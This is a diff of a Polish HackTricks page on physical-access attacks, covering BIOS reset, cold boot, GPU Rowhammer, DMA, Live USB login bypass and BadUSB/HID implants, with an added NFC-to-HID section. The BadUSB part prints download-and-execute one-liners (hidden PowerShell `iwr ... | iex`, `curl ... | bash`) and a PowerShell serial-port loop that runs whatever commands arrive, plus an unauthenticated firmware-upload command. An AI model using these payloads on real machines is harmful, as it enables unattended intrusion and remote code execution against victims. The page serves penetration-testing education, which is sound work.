@@ -2,17 +2,17 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Odzyskiwanie haseł BIOS i bezpieczeństwo systemu
+## Odzyskiwanie hasła BIOS-u i bezpieczeństwo systemu
 
-Ustawienia oprogramowania układowego starszych komputerów PC można zresetować, odłączając baterię CMOS lub używając opisanego w dokumentacji zworkowego resetu CMOS. Wymagany czas odłączenia zasilania zależy od płyty głównej, a hasła lub klucze nowoczesnego UEFI mogą być przechowywane w pamięci flash nieulotnej, kontrolerze wbudowanym lub urządzeniu zabezpieczającym, dlatego mogą przetrwać wyjęcie baterii. Przed zwieraniem pinów sprawdź instrukcję płyty głównej lub dokumentację serwisową; ta procedura może również unieważnić pomiary TPM i uruchomić odzyskiwanie klucza szyfrowania dysku.
+Ustawienia starszego oprogramowania układowego PC można zresetować, odłączając baterię CMOS lub używając opisanego w dokumentacji zworki clear-CMOS. Wymagany czas odłączenia zasilania zależy od płyty głównej. Nowoczesne hasła lub klucze UEFI mogą być przechowywane w nieulotnej pamięci flash, kontrolerze wbudowanym lub urządzeniu zabezpieczającym, dlatego odłączenie baterii może ich nie usunąć. Przed zwarciem pinów zapoznaj się z instrukcją płyty głównej lub serwisową; ta procedura może również unieważnić pomiary TPM i uruchomić procedurę odzyskiwania szyfrowania dysku.
 
-W starszych systemach x86 narzędzia takie jak **killCMOS** i **CmosPwd** mogą sprawdzać lub zmieniać ustawienia przechowywane w pamięci CMOS z poziomu środowiska rozruchowego. CmosPwd rozpoznaje formaty haseł z udokumentowanego zestawu starszych rodzin BIOS-u i może tworzyć kopię zapasową, przywracać lub usuwać/zerować stan CMOS; opublikowane wersje są przeznaczone dla starszych środowisk DOS/Windows, Linux, FreeBSD i NetBSD.<sup>[[18]](#references)</sup> Te narzędzia nie są uniwersalnymi narzędziami do usuwania haseł UEFI i wymagają odpowiedniego dostępu do sprzętu/oprogramowania układowego.
+W starszych systemach x86 narzędzia takie jak **killCMOS** i **CmosPwd** mogą sprawdzać lub zmieniać ustawienia zapisane w CMOS z poziomu środowiska rozruchowego. CmosPwd obsługuje formaty haseł z udokumentowanego zestawu starszych rodzin BIOS-u i może tworzyć kopie zapasowe, przywracać lub usuwać stan CMOS; opublikowane wersje są przeznaczone dla starszych środowisk DOS/Windows, Linux, FreeBSD i NetBSD.<sup>[[18]](#references)</sup> Te narzędzia nie są uniwersalnymi narzędziami do usuwania haseł UEFI i wymagają odpowiedniego dostępu do sprzętu lub oprogramowania układowego.
 
-Niektóre oprogramowanie układowe laptopów wyświetla kod weryfikacyjny specyficzny dla producenta po kilku nieudanych próbach wpisania hasła. Bazy danych, takie jak [bios-pw.org](https://bios-pw.org), mogą dla niektórych modeli wygenerować starsze hasła odzyskiwania producenta, ale wiele systemów blokuje dostęp bez możliwości wyprowadzenia kodu weryfikacyjnego. Traktuj każde wygenerowane hasło jako specyficzne dla danego modelu i unikaj wyczerpania limitu prób, po którym następuje trwała blokada.
+W niektórych laptopach po kilku nieudanych próbach wpisania hasła oprogramowanie układowe wyświetla kod wyzwania zależny od producenta. Bazy takie jak [bios-pw.org](https://bios-pw.org) mogą dla niektórych modeli wyliczyć starsze hasła odzyskiwania producenta, ale wiele systemów stosuje blokadę bez możliwości wyliczenia hasła na podstawie kodu wyzwania. Każde wygenerowane hasło traktuj jako specyficzne dla danego modelu i unikaj wyczerpania liczników prób, których nie można zresetować.
 
 ### Zabezpieczenia UEFI
 
-W nowoczesnych systemach **UEFI** CHIPSEC może audytować zabezpieczenia zmiennych Secure Boot. Najpierw uruchom poniższy test, który nie wprowadza zmian; opcjonalny tryb `-a modify` celowo próbuje uszkodzić zmienne i należy go używać wyłącznie w systemie laboratoryjnym, który można odzyskać. CHIPSEC ostrzega, że jego uprzywilejowany sterownik i niskopoziomowy dostęp do sprzętu nie nadają się do użycia na produkcyjnych punktach końcowych.<sup>[[11]](#references)</sup>
+W nowoczesnych systemach **UEFI** CHIPSEC może przeprowadzić audyt zabezpieczeń zmiennych Secure Boot. Najpierw uruchom poniższy test, który nie wprowadza zmian; opcjonalny tryb `-a modify` celowo próbuje uszkodzić zmienne i powinien być używany wyłącznie w możliwym do odzyskania systemie laboratoryjnym. CHIPSEC ostrzega, że jego uprzywilejowany sterownik i niskopoziomowy dostęp do sprzętu nie nadają się do produkcyjnych punktów końcowych.<sup>[[11]](#references)</sup>
 
 ```bash
 chipsec_main -m common.secureboot.variables
@@ -22,134 +22,155 @@ chipsec_main -m common.secureboot.variables -a modify
 
 ---
 
-## Analiza RAM i ataki Cold Boot
+## Analiza RAM i ataki cold-boot
 
-DRAM nie traci natychmiast wszystkich bitów po zatrzymaniu odświeżania. Tempo zanikania danych znacznie różni się w zależności od technologii modułu i temperatury; chłodzenie może zachować użyteczne dane znacznie dłużej niż cykl odłączenia zasilania bez chłodzenia. Atak Cold Boot polega na szybkim ponownym uruchomieniu urządzenia w niewielkim środowisku akwizycji lub przeniesieniu schłodzonego modułu, przechwyceniu surowej pamięci i odtworzeniu kluczy kryptograficznych mimo degradacji bitów. Narzędzie do kopiowania dysków nie jest automatycznie narzędziem do obrazowania pamięci fizycznej, a Volatility analizuje zrzut, zamiast go pozyskiwać; używaj odpowiedniego dla danej platformy, zweryfikowanego narzędzia do akwizycji.<sup>[[12]](#references)</sup>
+DRAM nie traci natychmiast wszystkich bitów po ustaniu odświeżania. Tempo zaniku danych znacznie zależy od technologii modułu i temperatury; chłodzenie może zachować użyteczne dane znacznie dłużej niż cykl wyłączenia i ponownego uruchomienia bez chłodzenia. Atak cold-boot polega na szybkim ponownym uruchomieniu systemu w niewielkim środowisku do akwizycji danych albo przeniesieniu schłodzonego modułu, przechwyceniu surowej pamięci i odtworzeniu kluczy kryptograficznych mimo zaniku części bitów. Narzędzie do kopiowania dysków nie jest automatycznie narzędziem do obrazowania pamięci fizycznej, a Volatility analizuje zrzut, zamiast go pozyskiwać; używaj zweryfikowanego narzędzia do akwizycji danych odpowiedniego dla danej platformy.<sup>[[12]](#references)</sup>
 
 ---
 
-## GPU Rowhammer przeciwko tablicom stron
+## GPU Rowhammer wymierzony w tablice stron
 
-Współczesne ataki GPU Rowhammer stają się znacznie bardziej użyteczne, gdy ich celem są **metadane pamięci wirtualnej GPU**, a nie zwykłe bufory. Ostatnie badania nad **kartami NVIDIA Ampere z GDDR6** pokazują, że atakujący uruchamiający nieuprzywilejowany kod CUDA może tworzyć wzorce hammeringu specyficzne dla GPU, używać **memory massaging**, aby umieścić struktury stronicowania w podatnych wierszach, a następnie odwracać bity w **tablicy stron ostatniego poziomu** lub pośrednim **katalogu stron**. Po uszkodzeniu pojedynczego wpisu translacji atakujący może uzyskać **dowolny odczyt/zapis pamięci GPU**, a następnie przejść do kompromitacji hosta.<sup>[[1]](#references)[[2]](#references)</sup>
+Współczesne ataki GPU Rowhammer są znacznie skuteczniejsze, gdy ich celem są **metadane pamięci wirtualnej GPU**, a nie zwykłe bufory. Niedawne badania nad **kartami NVIDIA Ampere z pamięcią GDDR6** pokazują, że atakujący, uruchamiając nieuprzywilejowany kod CUDA, może tworzyć wzorce hammeringu specyficzne dla GPU, stosować **memory massaging**, aby umieścić struktury stronicowania w podatnych wierszach, a następnie odwracać bity w **tablicy stron ostatniego poziomu** lub pośrednim **katalogu stron**. Po uszkodzeniu pojedynczego wpisu translacji atakujący może uzyskać **dowolny odczyt/zapis pamięci GPU**, a następnie przejść do kompromitacji hosta.<sup>[[1]](#references)[[2]](#references)</sup>
 
 ### Schemat eksploatacji
 
-1. **Zidentyfikuj wiersze podatne na hammering** w GDDR6 i utwórz wzorce hammeringu uwzględniające odświeżanie / nierównomierne, które omijają mechanizmy zabezpieczające wbudowane w DRAM.
-2. **Przygotuj alokacje GPU** tak, aby sterownik umieszczał struktury translacji stron w podatnych lokalizacjach fizycznych, zamiast trzymać je w domyślnej, chronionej puli. W praktyce może to oznaczać wyczerpanie regionu tablic stron o niskich adresach pamięci i rozrzucenie dużych, rzadkich mapowań UVM z kontrolowanymi odstępami.
-3. **Odwróć bity metadanych translacji**, takich jak **PFN** lub bity związane z aperturą, we wpisie tablicy stron / katalogu stron, aby kontrolowana przez atakującego strona wirtualna wskazywała strony tablic stron, dowolną pamięć GPU lub mapowania systemowe widoczne dla hosta.
-4. Wykorzystaj ponownie sfałszowane mapowanie, aby przepisać kolejne wpisy translacji i uzyskać **dowolny odczyt/zapis pamięci GPU** w różnych kontekstach GPU.
+1. **Zidentyfikuj podatne na hammering wiersze** w pamięci GDDR6 i utwórz wzorce hammeringu uwzględniające odświeżanie / nierównomierne, które omijają zabezpieczenia wbudowane w DRAM.
+2. **Przygotuj alokacje GPU** tak, aby sterownik umieszczał struktury translacji stron w podatnych lokalizacjach fizycznych, zamiast pozostawiać je w domyślnej, chronionej puli. W praktyce może to oznaczać wyczerpanie obszaru pamięci o niskich adresach przeznaczonego na tablice stron i rozrzucenie dużych, rzadkich mapowań UVM ze sterowanymi odstępami.
+3. **Odwróć bity w metadanych translacji**, takich jak **PFN** lub bity związane z aperture we wpisie tablicy stron / katalogu stron, aby kontrolowana przez atakującego strona wirtualna wskazywała na strony tablicy stron, dowolną pamięć GPU lub mapowania systemowe widoczne dla hosta.
+4. Wykorzystaj sfałszowane mapowanie do zmiany kolejnych wpisów translacji i uzyskania **dowolnego odczytu/zapisu pamięci GPU** w różnych kontekstach GPU.
 
-### Przejście do hosta i środki zaradcze
+### Przejście do hosta i zabezpieczenia
 
-- Przy **wyłączonym IOMMU** sfałszowane mapowania apertury systemowej mogą udostępnić GPU dowolną **pamięć fizyczną hosta**, zmieniając prymityw GPU w pełną kompromitację hosta.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
-- **GDDRHammer** atakuje wpisy tablicy stron ostatniego poziomu, podczas gdy **GeForge** pokazuje, że łatwiej może być uszkodzić poziom katalogu stron, ponieważ odwrócenie jednego bitu może przekierować większe poddrzewo translacji. Nie traktuj tylko jednej warstwy stronicowania jako krytycznej z punktu widzenia bezpieczeństwa.<sup>[[1]](#references)[[2]](#references)</sup>
-- **IOMMU** nadal ma znaczenie, ponieważ blokuje bezpośrednią ścieżkę do dowolnej pamięci hosta wykorzystywaną przez GDDRHammer/GeForge, ale **nie jest kompletnym środkiem zaradczym**. **GPUBreach** pokazuje drugi etap ataku, w którym atakujący uszkadza zapisywalne przez GPU bufory CPU należące do sterownika, a następnie wywołuje błędy bezpieczeństwa pamięci w sterowniku NVIDIA, aby uzyskać prymityw umożliwiający zapis do jądra i **root shell**, nawet przy włączonym IOMMU.<sup>[[3]](#references)</sup>
-- **Systemowy ECC** to praktyczny krok wzmacniający zabezpieczenia na obsługiwanych kartach GPU do stacji roboczych i serwerów. Konsumenckie karty GPU bez ECC mają słabsze zabezpieczenia.<sup>[[4]](#references)</sup>
-- Ataki te nie są czysto teoretyczne: **GeForge** zgłosił **1 171** odwróconych bitów na RTX 3060 i **202** na RTX A6000, co wystarczyło do zbudowania działającego łańcucha eskalacji uprawnień na hoście.<sup>[[2]](#references)[[9]](#references)</sup>
+- Gdy **IOMMU jest wyłączone**, sfałszowane mapowania system aperture mogą udostępnić GPU dowolną **pamięć fizyczną hosta**, zmieniając prymityw GPU w pełną kompromitację hosta.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
+- **GDDRHammer** atakuje wpisy tablicy stron ostatniego poziomu, natomiast **GeForge** pokazuje, że uszkodzenie poziomu katalogu stron może być łatwiejsze, ponieważ odwrócenie jednego bitu może przekierować większe poddrzewo translacji. Nie traktuj tylko jednej warstwy stronicowania jako krytycznej z punktu widzenia bezpieczeństwa.<sup>[[1]](#references)[[2]](#references)</sup>
+- **IOMMU** nadal ma znaczenie, ponieważ blokuje bezpośredni dostęp do dowolnej pamięci hosta wykorzystywany przez GDDRHammer/GeForge, ale **nie stanowi pełnego zabezpieczenia**. **GPUBreach** pokazuje drugi etap ataku: atakujący uszkadza zapisywalne przez GPU bufory CPU należące do sterownika, a następnie wywołuje błędy bezpieczeństwa pamięci w sterowniku NVIDIA, uzyskując możliwość zapisu do jądra i **powłokę root** nawet przy włączonym IOMMU.<sup>[[3]](#references)</sup>
+- **ECC na poziomie systemu** to praktyczne wzmocnienie zabezpieczeń w obsługiwanych kartach GPU do stacji roboczych i serwerów. Karty konsumenckie bez ECC oferują słabszą ochronę.<sup>[[4]](#references)</sup>
+- Ataki te nie są czysto teoretyczne: **GeForge** zgłosił **1,171** odwróconych bitów na RTX 3060 i **202** na RTX A6000, co wystarczyło do utworzenia działającego łańcucha eskalacji uprawnień na hoście.<sup>[[2]](#references)[[9]](#references)</sup>
 
 ---
 
-## Ataki Direct Memory Access (DMA)
+## Ataki bezpośredniego dostępu do pamięci (DMA)
 
-Informacje o offline’owym patchowaniu UEFI IFR/NVRAM, które może obniżyć poziom egzekwowania IOMMU przed uruchomieniem systemu i umożliwić atak DMA na Windows, znajdziesz tutaj:
+Informacje o modyfikowaniu IFR/NVRAM UEFI w trybie offline w celu obniżenia poziomu egzekwowania IOMMU przed uruchomieniem systemu i umożliwienia ataku DMA na Windows znajdziesz tutaj:
 
 {{#ref}}
 firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
 {{#endref}}
 
-**Inception** pokazuje pozyskiwanie i modyfikowanie pamięci za pomocą **DMA** przez interfejsy takie jak FireWire i wczesne konfiguracje Thunderbolt, w tym historyczne sygnatury omijania logowania. Nie jest po prostu „nieskuteczny wobec Windows 10”: możliwość wykorzystania zależy od interfejsu, kompilacji systemu docelowego, zasad IOMMU, stanu blokady oraz tego, czy funkcja Windows Kernel DMA Protection jest obsługiwana i włączona. Windows 10 w wersji 1803 i nowszych wprowadził Kernel DMA Protection na zgodnych platformach, znacząco zmieniając powierzchnię ataku.<sup>[[13]](#references)[[14]](#references)</sup>
+**Inception** demonstruje pozyskiwanie i modyfikowanie pamięci za pomocą DMA przez interfejsy takie jak FireWire i wczesne konfiguracje Thunderbolt, w tym historyczne sygnatury omijania logowania. Nie jest to po prostu narzędzie „nieskuteczne wobec Windows 10”: podatność na atak zależy od interfejsu, wersji systemu docelowego, zasad IOMMU, stanu blokady oraz tego, czy funkcja Windows Kernel DMA Protection jest obsługiwana i włączona. Windows 10 w wersji 1803 i nowszych wprowadził Kernel DMA Protection na zgodnych platformach, znacząco zmieniając powierzchnię ataku.<sup>[[13]](#references)[[14]](#references)</sup>
 
 ---
 
-## Live CD/USB do uzyskiwania dostępu do systemu
+## Dostęp do systemu za pomocą Live CD/USB
 
-W przypadku niezaszyfrowanego lub już odblokowanego woluminu Windows środowisko offline może zastąpić pliki binarne funkcji ułatwień dostępu, takie jak **sethc.exe** lub **Utilman.exe**, plikiem **cmd.exe**, co pozwala uzyskać wiersz poleceń SYSTEM po użyciu odpowiedniego skrótu na ekranie logowania. Narzędzia takie jak **chntpw** mogą edytować dane lokalnych kont SAM. Metody te nie omijają zablokowanego woluminu BitLocker i mogą uszkodzić dane uwierzytelniające chronione przez DPAPI/EFS; zachowaj kopie śledcze i kopie zapasowe.
+W przypadku niezaszyfrowanego lub już odblokowanego woluminu Windows środowisko uruchomione w trybie offline może zastąpić pliki ułatwień dostępu, takie jak **sethc.exe** lub **Utilman.exe**, plikiem **cmd.exe**, co pozwala uzyskać wiersz poleceń SYSTEM po użyciu odpowiedniego skrótu na ekranie logowania. Narzędzia takie jak **chntpw** mogą modyfikować dane lokalnych kont SAM. Metody te nie omijają blokady woluminu BitLocker i mogą uszkodzić poświadczenia chronione przez DPAPI/EFS; zachowaj kopie kryminalistyczne i kopie zapasowe.
 
-**Kon-Boot** to komercyjne narzędzie do omijania uwierzytelniania podczas rozruchu, przeznaczone dla obsługiwanych konfiguracji Windows/macOS. Zgodność zależy od systemu operacyjnego, trybu firmware, Secure Boot i konfiguracji szyfrowania dysku; narzędzie nie odszyfrowuje zablokowanego woluminu BitLocker.<sup>[[10]](#references)</sup>
+**Kon-Boot** to komercyjne narzędzie do omijania uwierzytelniania podczas uruchamiania, obsługujące wybrane konfiguracje Windows/macOS. Zgodność zależy od systemu operacyjnego, trybu firmware, Secure Boot i konfiguracji szyfrowania dysku; narzędzie nie odszyfrowuje zablokowanego woluminu BitLocker.<sup>[[10]](#references)</sup>
 
 ---
 
 ## Obsługa funkcji zabezpieczeń Windows
 
-### Skróty rozruchu i odzyskiwania
+### Skróty uruchamiania i odzyskiwania
 
 - **Delete/Supr**, F2, F10 lub inny klawisz producenta może otworzyć konfigurację firmware.
-- **F8** otwiera starsze zaawansowane opcje rozruchu Windows tylko w konfiguracjach, w których ta ścieżka jest nadal włączona; obecnie sposób przejścia do odzyskiwania zależy od konfiguracji.
-- Przytrzymanie **Shift** może w niektórych konfiguracjach zablokować automatyczne logowanie do Windows, choć ustawienia zasad/rejestru mogą wyłączyć to działanie.<sup>[[17]](#references)</sup>
+- **F8** otwiera starsze zaawansowane opcje rozruchu Windows tylko w konfiguracjach, w których ta ścieżka pozostaje włączona; obecnie sposób wejścia do środowiska odzyskiwania zależy od konfiguracji.
+- Przytrzymanie **Shift** może w niektórych konfiguracjach wyłączyć automatyczne logowanie do Windows, choć ustawienia zasad/rejestru mogą wyłączyć takie działanie.<sup>[[17]](#references)</sup>
 
 ### Urządzenia BAD USB
 
-Urządzenia takie jak **USB Rubber Ducky** i płytki Teensy mogą zgłaszać się jako zaufane klawiatury HID i wprowadzać zdefiniowane wcześniej sekwencje klawiszy. Ładunek początkowo ma uprawnienia i dostęp do pulpitu zalogowanej sesji; ograniczają go jednak monity UAC, blokada ekranu, układ klawiatury, czas wykonywania oraz zasady dotyczące USB na punktach końcowych.<sup>[[15]](#references)</sup>
+Urządzenia takie jak **USB Rubber Ducky** i płytki Teensy mogą zgłaszać się jako zaufane klawiatury HID i wprowadzać zaprogramowane sekwencje klawiszy. Początkowo payload ma uprawnienia i dostęp do pulpitu takie jak zalogowana sesja; ograniczają go jednak monity UAC, blokada ekranu, układ klawiatury, synchronizacja oraz zasady USB na punktach końcowych.<sup>[[15]](#references)</sup>
 
 ### Volume Shadow Copy
 
-Uprawnienia administratora lub kopii zapasowych pozwalają utworzyć kopię w tle albo zapisać gałęzie rejestru, aby pozyskać zablokowane pliki, takie jak **SAM** i **SYSTEM**. Jest to technika zbierania danych po uzyskaniu dostępu, a nie sposób na obejście uprawnień. Należy powiązać ją ze zdarzeniami użycia `diskshadow`/VSS i eksportu gałęzi rejestru.
+Uprawnienia administratora lub kopii zapasowych pozwalają utworzyć kopię w tle albo zapisać ule rejestru, aby pozyskać zablokowane pliki, takie jak **SAM** i **SYSTEM**. Jest to technika zbierania danych po kompromitacji, a nie omijania kontroli uprawnień; należy skorelować ją ze zdarzeniami `diskshadow`/VSS i eksportem uli rejestru.
 
 ## Techniki implantów BadUSB / HID
 
-### Implanty Wi-Fi w kablach
+### Urządzenie HID Androida wyzwalane przez NFC
 
-- Implanty oparte na ESP32-S3, takie jak **Evil Crow Cable Wind**, ukrywają się wewnątrz kabli USB-A→USB-C lub USB-C↔USB-C, zgłaszają się wyłącznie jako klawiatura USB i udostępniają stos C2 przez Wi-Fi. Operator musi jedynie zasilić kabel z komputera ofiary, utworzyć hotspot o nazwie `Evil Crow Cable Wind` z hasłem `123456789` i przejść do [http://cable-wind.local/](http://cable-wind.local/) (lub jego adresu DHCP), aby uzyskać dostęp do wbudowanego interfejsu HTTP.<sup>[[8]](#references)</sup>
-- Interfejs przeglądarkowy udostępnia karty *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* i *Config*. Zapisane ładunki są oznaczane według systemu operacyjnego, układy klawiatury można zmieniać na bieżąco, a ciągi VID/PID można modyfikować, aby podszywać się pod znane urządzenia peryferyjne.
-- Ponieważ C2 znajduje się wewnątrz kabla, telefon może przygotować ładunki, uruchomić ich wykonanie i zarządzać danymi logowania Wi-Fi bez korzystania z sieci organizacji — jest to przydatne podczas krótkotrwałych fizycznych włamań.
+Zrootowany telefon z Androidem może działać jako programowalna klawiatura USB tylko wtedy, gdy jego kontroler USB i jądro obsługują **USB gadget/HID**. Na zgodnych urządzeniach Kali NetHunter udostępnia profile gadget przez **USB Arsenal**. Inną opcją jest [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), który tworzy funkcje gadget ConfigFS i może udostępniać urządzenia znakowe klawiatury/myszy, takie jak `/dev/hidg0` i `/dev/hidg1`. Narzędzie tworzy jedynie punkt końcowy gadget; osobny proces musi zapisywać do niego raporty HID. Dostęp root nie zastąpi jądra pozbawionego ConfigFS, obsługi HID gadget lub użytecznego kontrolera USB Device Controller.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>
 
-### Ładunki AutoExec rozpoznające system operacyjny
+Ten punkt końcowy można połączyć z NFC w Androidzie, które pełni funkcję fizycznego wyzwalacza. Aplikacja [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) odczytuje UID znacznika, konwertuje go do oczekiwanej reprezentacji, sprawdza lokalną listę dozwolonych i po dopasowaniu wysyła skonfigurowaną sekwencję klawiaturową w stylu Rubber Ducky. Podłączony host widzi zwykłe dane wejściowe klawiatury i nie potrzebuje oprogramowania NFC.<sup>[[22]](#references)[[24]](#references)</sup>
 
-- Reguły AutoExec przypisują jeden lub więcej ładunków do natychmiastowego uruchomienia po enumeracji USB. Implant wykonuje uproszczoną identyfikację systemu operacyjnego i wybiera pasujący skrypt.
+Przed użyciem skrótów lub poleceń sprawdź, czy urządzenie jest prawidłowo wykrywane i czy układ klawiatury działa, korzystając z pustego edytora tekstu. Nieszkodliwy payload:<sup>[[24]](#references)</sup>
+
+```text
+DELAY 1000
+STRING NFC HID test successful
+ENTER
+```
+
+Ważne granice zaufania:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
+
+- **Biała lista UID służy do identyfikacji, a nie uwierzytelniania**. UID są publiczne, a niektóre typy tokenów lub emulatory umożliwiają klonowanie albo podszywanie się pod token. Skopiowany dozwolony UID przechodzi tę samą ścieżkę obsługi co oryginalny token.
+- Moduł Magisk **NfcScreenOff** modyfikuje usługę NFC, aby zachowywała się tak, jakby ekran był włączony, a telefon odblokowany. Jeśli telefon jest już podłączony do hosta, może to umożliwić uruchomienie payloadu bez odblokowywania telefonu.
+- Hasła, tokeny API i polecenia zapisane w payloadzie to możliwe do odzyskania sekrety na urządzeniu z rootem lub odblokowanym bootloaderem. Wpisywanie hasła przez HID to automatyzacja z użyciem wielokrotnego hasła, a nie uwierzytelnianie bezhasłowe.
+- Wstrzykiwanie HID działa z uprawnieniami aktywnego pulpitu i zależy od fokusu, czasu oraz układu klawiatury hosta. Przed wykonaniem wrażliwych działań wymagaj niedawnego potwierdzenia użytkownika, unikaj umieszczania uprzywilejowanych sekretów w skryptach i używaj uwierzytelniacza z kryptograficznym challenge-response do prawdziwego uwierzytelniania.
+
+### Implanty kablowe z Wi-Fi
+
+- Implanty oparte na ESP32-S3, takie jak **Evil Crow Cable Wind**, ukrywają się w kablach USB-A→USB-C lub USB-C↔USB-C, są wykrywane wyłącznie jako klawiatura USB i udostępniają swój stos C2 przez Wi-Fi. Operator musi jedynie zasilić kabel z hosta ofiary, utworzyć hotspot o nazwie `Evil Crow Cable Wind` z hasłem `123456789` i przejść do [http://cable-wind.local/](http://cable-wind.local/) (lub jego adresu DHCP), aby uzyskać dostęp do wbudowanego interfejsu HTTP.<sup>[[8]](#references)</sup>
+- Interfejs w przeglądarce zawiera karty *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* i *Config*. Zapisane payloady są oznaczone według systemu operacyjnego, układy klawiatury można przełączać w locie, a ciągi VID/PID można zmieniać, by naśladować znane urządzenia peryferyjne.
+- Ponieważ C2 znajduje się wewnątrz kabla, telefon może przygotowywać payloady, uruchamiać je i zarządzać poświadczeniami Wi-Fi bez korzystania z sieci organizacji — przydatne podczas krótkotrwałych fizycznych włamań.
+
+### Payloady AutoExec uwzględniające system operacyjny
+
+- Reguły AutoExec przypisują jeden lub więcej payloadów do natychmiastowego uruchomienia po enumeracji USB. Implant przeprowadza uproszczone rozpoznanie systemu operacyjnego i wybiera pasujący skrypt.
 - Przykładowy przebieg:
   - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
   - *macOS/Linux:* `COMMAND SPACE` (Spotlight) lub `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
-- Ponieważ wykonanie odbywa się bez nadzoru, samo podmienienie kabla do ładowania może zapewnić początkowy dostęp typu „plug-and-pwn” w kontekście zalogowanego użytkownika.
+- Ponieważ wykonanie odbywa się bez nadzoru, sama wymiana kabla do ładowania może zapewnić początkowy dostęp typu „plug-and-pwn” w kontekście zalogowanego użytkownika.
 
-### Zdalny shell przez Wi-Fi TCP inicjowany za pomocą HID
+### Zdalna powłoka przez Wi-Fi TCP uruchamiana za pomocą HID
 
-1. **Inicjowanie za pomocą sekwencji klawiszy:** Zapisany ładunek otwiera konsolę i wkleja pętlę, która wykonuje wszystko, co otrzyma z nowego urządzenia USB serial. Minimalny wariant dla Windows to:
+1. **Inicjalizacja za pomocą naciśnięć klawiszy:** zapisany payload otwiera konsolę i wkleja pętlę wykonującą wszystko, co nadejdzie przez nowe urządzenie USB serial. Minimalny wariant dla Windows:
 
 ```powershell
 $port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
 $port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
 ```
 
-2. **Cable bridge:** Implant utrzymuje otwarty kanał USB CDC, podczas gdy jego ESP32-S3 uruchamia klienta TCP (skrypt Python, APK Androida lub aplikację desktopową), który łączy się z powrotem z operatorem. Każdy bajt wpisany w sesji TCP jest przekazywany do opisanego wyżej obiegu szeregowego, co umożliwia zdalne wykonywanie poleceń nawet na hostach odizolowanych od sieci. Możliwości uzyskiwania danych wyjściowych są ograniczone, dlatego operatorzy zazwyczaj uruchamiają polecenia bez wglądu w ich wynik (tworzenie kont, przygotowywanie dodatkowych narzędzi itp.).
+2. **Most kablowy:** Implant utrzymuje otwarty kanał USB CDC, podczas gdy jego ESP32-S3 uruchamia klienta TCP (skrypt Python, APK na Androida lub plik wykonywalny na komputerze) łączącego się z powrotem z operatorem. Wszystkie bajty wpisane w sesji TCP są przekazywane do opisanego wyżej loopu szeregowego, co umożliwia zdalne wykonywanie poleceń nawet na hostach odizolowanych od sieci. Ilość dostępnych danych wyjściowych jest ograniczona, dlatego operatorzy zazwyczaj uruchamiają polecenia bez informacji zwrotnej (tworzenie kont, przygotowywanie dodatkowych narzędzi itp.).
 
 ### Powierzchnia aktualizacji HTTP OTA
 
-- Udokumentowany interfejs Evil Crow Cable udostępnia nieuwierzytelniony endpoint aktualizacji firmware’u pod adresem `/update`:<sup>[[8]](#references)</sup>
+- Udokumentowany interfejs Evil Crow Cable Wind udostępnia nieuwierzytelniony endpoint aktualizacji firmware’u `/update`:<sup>[[8]](#references)</sup>
 
 ```bash
 curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
 ```
 
-- Operatorzy terenowi mogą wymieniać funkcje w trakcie działania (np. wgrać firmware USB Army Knife) bez otwierania kabla, dzięki czemu implant może uzyskać nowe możliwości, pozostając podłączony do hosta docelowego.
+- Operatorzy terenowi mogą wykonywać hot-swap funkcji (np. wgrać firmware USB Army Knife) w trakcie operacji bez otwierania kabla, dzięki czemu implant może przełączyć się na nowe możliwości, pozostając podłączony do hosta docelowego.
 
 ## Omijanie szyfrowania BitLocker
 
-Autoryzowane pozyskanie danych kryminalistycznych z działającego lub niedawno używanego systemu może ujawnić główny klucz woluminu BitLocker lub powiązany materiał kluczowy, gdy wolumin jest odblokowany. Komercyjne narzędzia, takie jak Elcomsoft Forensic Disk Decryptor i Passware Kit Forensic, mogą przeszukiwać obsługiwane obrazy pamięci, pliki hibernacji lub zrzuty awaryjne, ale powodzenie nie jest gwarantowane. Nowoczesny Windows szyfruje również zrzuty awaryjne, gdy włączony jest BitLocker, a zapisane 48-cyfrowe hasło odzyskiwania jest innym artefaktem niż klucz woluminu znajdujący się w pamięci.<sup>[[12]](#references)[[16]](#references)</sup>
+Autoryzowane pozyskanie danych kryminalistycznych z działającego lub niedawno uruchomionego systemu może obejmować główny klucz woluminu BitLocker lub powiązany materiał kluczowy, gdy wolumin jest odblokowany. Komercyjne narzędzia, takie jak Elcomsoft Forensic Disk Decryptor i Passware Kit Forensic, mogą przeszukiwać obsługiwane obrazy pamięci, pliki hibernacji lub zrzuty awaryjne, ale powodzenie nie jest gwarantowane. Nowoczesny Windows szyfruje również zrzuty awaryjne, gdy włączony jest BitLocker, a zapisane 48-cyfrowe hasło odzyskiwania to inny artefakt niż klucz woluminu znajdujący się w pamięci.<sup>[[12]](#references)[[16]](#references)</sup>
 
 ---
 
 ## Inżynieria społeczna w celu dodania klucza odzyskiwania
 
-Atakujący, który przekona administratora do uruchomienia poleceń zarządzających BitLockerem, może dodać hasło odzyskiwania, klucz zewnętrzny lub inny mechanizm ochrony, a następnie go przechwycić. Hasło odzyskiwania nie może być dowolnym ciągiem samych zer: numeryczne hasła odzyskiwania BitLockera muszą mieć poprawny, zweryfikowany format 48 cyfr. Składnia polecenia używana w autoryzowanym zarządzaniu to `manage-bde -protectors -add C: -recoverypassword`; dodane mechanizmy ochrony można wyświetlić poleceniem `manage-bde -protectors -get C:`. Monitoruj dodawanie mechanizmów ochrony i dopilnuj, by nowy materiał odzyskiwania był przechowywany wyłącznie w zatwierdzonych lokalizacjach.<sup>[[16]](#references)</sup>
